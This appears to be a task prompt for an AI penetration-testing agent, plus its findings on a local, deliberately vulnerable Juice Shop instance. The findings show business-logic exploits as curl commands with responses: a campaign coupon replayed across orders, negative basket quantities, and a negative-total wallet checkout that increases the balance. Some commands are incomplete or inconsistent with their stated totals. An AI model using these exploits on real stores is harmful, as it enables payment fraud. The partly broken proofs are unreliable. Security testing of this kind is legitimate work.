[JUICESHOP] B

You are an AI penetration testing agent specializing in business logic vulnerability detection. Your task is to test a web application REST API for business logic flow bypass vulnerabilities.

IMPORTANT RULES:
- You MUST only test for BUSINESS LOGIC FLOW BYPASS vulnerabilities (skipping steps, replaying steps, reordering steps, dropping steps in multi-step workflows)
- Do NOT test for technical vulnerabilities (SQLi, XSS, CSRF, etc.)
- Do NOT test for IDOR/BOLA or access control issues
- Focus ONLY on: Can workflow steps be skipped, replayed, reordered, or dropped to achieve an unintended outcome?

TARGET: http://localhost:3000

TOOLS AVAILABLE:
- curl (use -s flag for silent mode)
- You have full terminal access

METHODOLOGY:
1. First, explore the target to discover its endpoints and identify the multi-step workflows the application implements
2. For each workflow you identify, reconstruct the intended sequence of steps (including any preconditions between steps)
3. Then systematically test each workflow for flow bypass possibilities
4. For each test, document:
   - What you tested (which step you tried to skip/replay/reorder)
   - The exact curl command you used
   - The response you got
   - Whether it indicates a vulnerability (and why)

OUTPUT FORMAT:
For each finding, report:
- FINDING ID (e.g., FLOW-001)
- VULNERABILITY TYPE (skip/replay/reorder/drop)
- DESCRIPTION: What flow bypass was found
- SEVERITY: Critical/High/Medium/Low
- BUSINESS IMPACT: What an attacker could achieve
- PROOF: The exact curl commands and responses proving the vulnerability

Your task: For every multi-step workflow you discover in the application, systematically generate and test ALL possible deviations from the intended sequence. For each workflow, test:
1. SKIP: For every non-adjacent step pair (A, C) where the intended path is A→B→C, test if you can go directly from A to C without completing B
2. REPLAY: After completing a workflow, test if any step's request can be replayed to achieve the same effect again (e.g., claim a one-time bonus twice, redeem the same token twice, confirm an order twice)
3. REORDER: Test if steps can be executed in a different order than the intended sequence (e.g., apply a discount before adding items, redeem a token before paying for it)
4. DROP: Test what happens when an expected intermediate step is never executed (e.g., authenticate but never complete a required verification step, then try to access protected resources)

Be exhaustive. For each workflow you discover, enumerate EVERY possible skip combination, EVERY replay opportunity, EVERY reorder permutation, and EVERY drop scenario. Then test each one.

Begin your testing now. Start by discovering the application's workflows, then work through each one systematically.

  FLOW-005 — REPLAY: Campaign Coupon Applied to Multiple Orders               
                                                               
  Vulnerability Type: REPLAY
  Severity: High                                                                
  Workflow: W2 — Coupon Application
                                                                                
  Description: The couponData base64 payload (used for campaign coupons) can be 
  replayed on unlimited orders. Since the campaign coupon validation reads from
  the HTTP request body at checkout time rather than any per-user redemption    
  record, the same couponData can be submitted on every single order.
                                                                              
  Proof:
  # Apply 75% campaign coupon to Order 1 (T-Shirt $22.49 → $5.62)
  curl -s -X POST http://localhost:3000/rest/basket/6/checkout \ 
    -H "Authorization: Bearer $TOKEN" \                                         
    -H "Content-Type: application/json" \
    -d '{"couponData":"V01OU0RZMjAxOS0xNTUxOTk5NjAwMDAw","orderDetails":{}}'    
  # Track order 94b7-40f20967de3ccb1d: "totalPrice": 5.62, "promotionalAmount": 
  "16.87"                                                                       
                                                                                
  # Apply SAME coupon to Order 2 (another T-Shirt)
  curl -s -X POST http://localhost:3000/rest/basket/6/checkout \                
    -H "Authorization: Bearer $TOKEN" \                           
    -H "Content-Type: application/json" \                                       
    -d '{"couponData":"V01OU0RZMjAxOS0xNTUxOTk5NjAwMDAw","orderDetails":{}}'
  # Track order 94b7-2d0ab575aa555923: "totalPrice": 5.62, "promotionalAmount": 
  "16.87"                                                                       
  # 75% discount applied AGAIN with NO changes to coupon state                  
                                                                  
  Business Impact: Combined with FLOW-002 (expired coupon bypass), an attacker  
  can get 75% off every single order they ever place, permanently.

  FLOW-007 — REORDER: Negative Quantity Accepted in Basket                    
                                                                                
  Vulnerability Type: REORDER (manipulating basket data before checkout)
  Severity: Critical                                                            
  Workflow: W1 — Shopping Checkout                                
                                                                                
  Description: The basket item quantity update endpoint (PUT                    
  /api/BasketItems/:id) performs a stock availability check (product.quantity >=
   requested_quantity). Since any positive stock value is greater than or equal 
  to a negative quantity, negative quantities always pass validation. This
  allows items to be added with negative quantities (e.g., -100), producing a 
  negative line-item total, which propagates to a negative order total.

  Proof:

  # Step 1: Add item to basket normally
  curl -s -X POST http://localhost:3000/api/BasketItems \                       
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \                                       
  # Returns item id=19                                                          
                                                                              
  # Step 2 (REORDER): Update quantity to -100 — passes stock check              
  curl -s -X PUT http://localhost:3000/api/BasketItems/19 \                     
    -H "Authorization: Bearer $TOKEN" \                                         
    -H "Content-Type: application/json" \                                       
    -d '{"quantity":-100}'                                                    
  # Response: {"status":"success","data":{..."quantity":-100...}}  ← accepted!  
                                                                              
  # Alternative: POST with negative quantity directly                           
  curl -s -X POST http://localhost:3000/api/BasketItems \         
    -H "Authorization: Bearer $TOKEN" \                                         
    -H "Content-Type: application/json" \                         
    -d '{"ProductId":1,"BasketId":6,"quantity":-50}'                            
  # Response: {"status":"success","data":{..."quantity":-50...}}  ← also 
  accepted!                                                                     
                                                                                
  Business Impact: See FLOW-008 for full financial exploitation. Additionally,
  when the negative-quantity order is processed, the stock deduction becomes:   
  newQuantity = currentStock - (negative_qty) = currentStock + |negative_qty|,
  which INCREASES product inventory, corrupting stock records.

  FLOW-008 — REORDER + REPLAY CHAIN: Negative Order Total Drains Wallet In 
  Reverse (Money Generation)                                                    
                            
  Vulnerability Type: REORDER + CHAIN                                           
  Severity: Critical                                                            
  Workflow: W1 (Checkout) + W4 (Wallet)                                       
                                                                                
  Description: When a basket contains items with negative quantities, the order 
  total becomes negative. If the user selects wallet as the payment method, the
  server performs WalletModel.decrement({ balance: totalPrice }) — decrementing 
  the wallet by a negative amount, which is a database-level increment. The
  wallet balance check wallet.balance >= totalPrice passes trivially (any     
  positive balance exceeds a negative totalPrice). This is an infinite money
  generation exploit.

  Proof:

  # Baseline: wallet balance = $4.02
  curl -s -H "Authorization: Bearer $TOKEN"                                     
  http://localhost:3000/rest/wallet/balance
  # {"status":"success","data":4.02}                                            
                                                                                
  # Step 1: Add one positive item (Apple Juice $1.99, qty:1)                    
  curl -s -X POST http://localhost:3000/api/BasketItems \                       
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \     
    -d '{"ProductId":1,"BasketId":6,"quantity":1}'                              
                                                                              
  # Step 2: Add a negative-quantity item (Orange Juice $2.99, qty:-5)           
  curl -s -X POST http://localhost:3000/api/BasketItems \         
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \     
    -d '{"ProductId":2,"BasketId":6,"quantity":1}'  # -> item id=23
                                                                                
  curl -s -X PUT http://localhost:3000/api/BasketItems/23 \                     
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \     
  # Expected total: $1.99 + (-5 × $2.99) = $1.99 - $14.95 = -$12.96             
                                                                                
  # Step 3 (CHAIN): Checkout with wallet payment — totalPrice is negative       
  curl -s -X POST http://localhost:3000/rest/basket/6/checkout \                
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \     
    -d '{"couponData":"","orderDetails":{"paymentId":"wallet","addressId":1,"del
  iveryMethodId":3}}'                                                           
  # Response: {"orderConfirmation":"94b7-7513f74d22eee598"}                     
  # Order record: "totalPrice": -11.46                            
                                                                                
  # Step 4: Wallet balance AFTER — should have DECREASED but INCREASED instead
  curl -s -H "Authorization: Bearer $TOKEN"                                     
  http://localhost:3000/rest/wallet/balance                       
  # {"status":"success","data":15.48}  ← increased by $11.46!                   
                                                                  
  # Server-side: WalletModel.decrement({ balance: -11.46 }) = INCREMENT by 11.46
  # wallet.balance >= totalPrice → 4.02 >= -11.46 → TRUE (check bypassed)       
                                                                                
  Business Impact: Attackers can generate unlimited wallet balance by           
  repeatedly:                                                                 
  1. Adding a high-value item with a large negative quantity                    
  2. Checking out with wallet payment                                           
  3. The wallet increases by the absolute value of the negative total each    
  iteration                                                                     
                                                                                
  This allows infinite free purchases, and the stolen funds come directly from
  the application's revenue.
